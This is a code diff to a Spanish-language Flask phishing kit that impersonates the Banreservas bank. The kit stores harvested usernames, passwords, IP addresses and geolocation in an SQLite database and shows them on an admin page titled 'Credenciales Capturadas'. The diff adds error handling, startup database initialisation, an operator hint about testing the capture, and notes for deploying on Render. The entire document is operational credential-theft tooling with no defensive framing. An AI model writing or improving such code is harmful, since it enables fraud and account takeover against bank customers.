@@ -98,6 +98,7 @@ def load_config():
         pass
 
 def init_db():
+    """Inicializa la base de datos y crea la tabla si no existe"""
     try:
         conn = sqlite3.connect('credentials.db', check_same_thread=False)
         cursor = conn.cursor()
@@ -116,8 +117,10 @@ def init_db():
         conn.commit()
         conn.close()
         logger.info("Base de datos inicializada correctamente")
+        return True
     except Exception as e:
         logger.error(f"Error al inicializar la base de datos: {e}")
+        return False
 
 def cleanup_old_credentials(days=None):
     if days is None:
@@ -536,6 +539,15 @@ def get_template_banreservas():
 </body>
 </html>'''
 
+# =============================================
+# RUTAS Y DECORADORES
+# =============================================
+
+@app.before_request
+def initialize_db_on_startup():
+    """Inicializa la base de datos antes de la primera solicitud"""
+    init_db()
+
 @app.after_request
 def add_security_headers(response):
     response.headers['X-Frame-Options'] = 'DENY'
@@ -709,48 +721,89 @@ def ver_credenciales():
     if not session.get('admin_logged'):
         return redirect('/login-credenciales')
     
-    conn = sqlite3.connect('credentials.db', check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
-    rows = cursor.fetchall()
-    conn.close()
-    
-    if not rows:
-        return "<h1>📭 No hay credenciales</h1><a href='/login-credenciales'>Volver</a>"
-    
-    html = """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Credenciales</title>
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
+        rows = cursor.fetchall()
+        conn.close()
+        
+        if not rows:
+            return """
+            <!DOCTYPE html>
+            <html>
+            <head><title>Credenciales</title>
+            <style>
+                body{font-family:Arial;background:#f0f2f5;padding:20px;text-align:center;}
+                h1{color:#1a73e8;}
+                .container{background:white;padding:40px;border-radius:8px;max-width:600px;margin:0 auto;}
+                .logout{float:right;background:#dc3545;color:white;padding:8px 16px;border-radius:4px;text-decoration:none;}
+                .logout:hover{background:#c82333;}
+            </style>
+            </head>
+            <body>
+                <div class="container">
+                    <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
+                    <h1>📭 No hay credenciales</h1>
+                    <p>Todavía no se han capturado credenciales.</p>
+                    <p>Ve a <a href="/">la página principal</a> y haz clic en "Acceder a TuBanco" para probar.</p>
+                </div>
+            </body>
+            </html>
+            """
+        
+        html = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Credenciales</title>
+            <style>
+                body{font-family:Arial;background:#f0f2f5;padding:20px;}
+                h1{color:#1a73e8;text-align:center;}
+                table{width:100%;border-collapse:collapse;background:white;border-radius:8px;overflow:hidden;box-shadow:0 2px 4px rgba(0,0,0,0.1);}
+                th{background:#1a73e8;color:white;padding:12px;text-align:left;}
+                td{padding:10px;border-bottom:1px solid #ddd;}
+                tr:hover{background:#f5f5f5;}
+                .logout{float:right;background:#dc3545;color:white;padding:8px 16px;border-radius:4px;text-decoration:none;}
+                .logout:hover{background:#c82333;}
+            </style>
+        </head>
+        <body>
+            <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
+            <h1>🔐 Credenciales Capturadas</h1>
+            <p>Total: <strong>""" + str(len(rows)) + """</strong></p>
+            <table>
+                <tr><th>ID</th><th>Fecha</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Contraseña</th></tr>
+        """
+        
+        for r in rows:
+            html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[5]}</td><td>{r[3]}</td><td><strong>{r[4]}</strong></td></tr>"
+        
+        html += """
+            </table>
+        </body>
+        </html>
+        """
+        return html
+        
+    except Exception as e:
+        logger.error(f"Error al leer credenciales: {e}")
+        return """
+        <!DOCTYPE html>
+        <html>
+        <head><title>Error</title>
         <style>
-            body{font-family:Arial;background:#f0f2f5;padding:20px;}
-            h1{color:#1a73e8;text-align:center;}
-            table{width:100%;border-collapse:collapse;background:white;border-radius:8px;overflow:hidden;box-shadow:0 2px 4px rgba(0,0,0,0.1);}
-            th{background:#1a73e8;color:white;padding:12px;text-align:left;}
-            td{padding:10px;border-bottom:1px solid #ddd;}
-            tr:hover{background:#f5f5f5;}
-            .logout{float:right;background:#dc3545;color:white;padding:8px 16px;border-radius:4px;text-decoration:none;}
-            .logout:hover{background:#c82333;}
+            body{font-family:Arial;background:#f0f2f5;padding:20px;text-align:center;}
+            .error{color:#dc3545;}
         </style>
-    </head>
-    <body>
-        <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
-        <h1>🔐 Credenciales Capturadas</h1>
-        <p>Total: <strong>""" + str(len(rows)) + """</strong></p>
-        <table>
-            <tr><th>ID</th><th>Fecha</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Contraseña</th></tr>
-    """
-    
-    for r in rows:
-        html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[5]}</td><td>{r[3]}</td><td><strong>{r[4]}</strong></td></tr>"
-    
-    html += """
-        </table>
-    </body>
-    </html>
-    """
-    return html
+        </head>
+        <body>
+            <h1 class="error">⚠️ Error al leer la base de datos</h1>
+            <p>La base de datos aún no está lista. Por favor, captura una credencial primero.</p>
+            <p><a href="/">Volver a la página principal</a></p>
+        </body>
+        </html>
+        """, 500
 
 @app.route('/logout-credenciales')
 def logout_credenciales():
@@ -807,6 +860,10 @@ def get_credentials_count():
     except:
         return 0
 
+# =============================================
+# INICIO DE LA APLICACIÓN
+# =============================================
+
 if __name__ == '__main__':
     load_config()
     init_db()
@@ -819,3 +876,5 @@ if __name__ == '__main__':
     print(f"[+] Limpieza automática: {CONFIG.get('cleanup_days')} días")
     app.run(host='0.0.0.0', port=port, debug=False)
 
+# Esto es necesario para Render (Gunicorn buscará 'app')
+# La variable 'app' ya está definida como Flask(__name__)
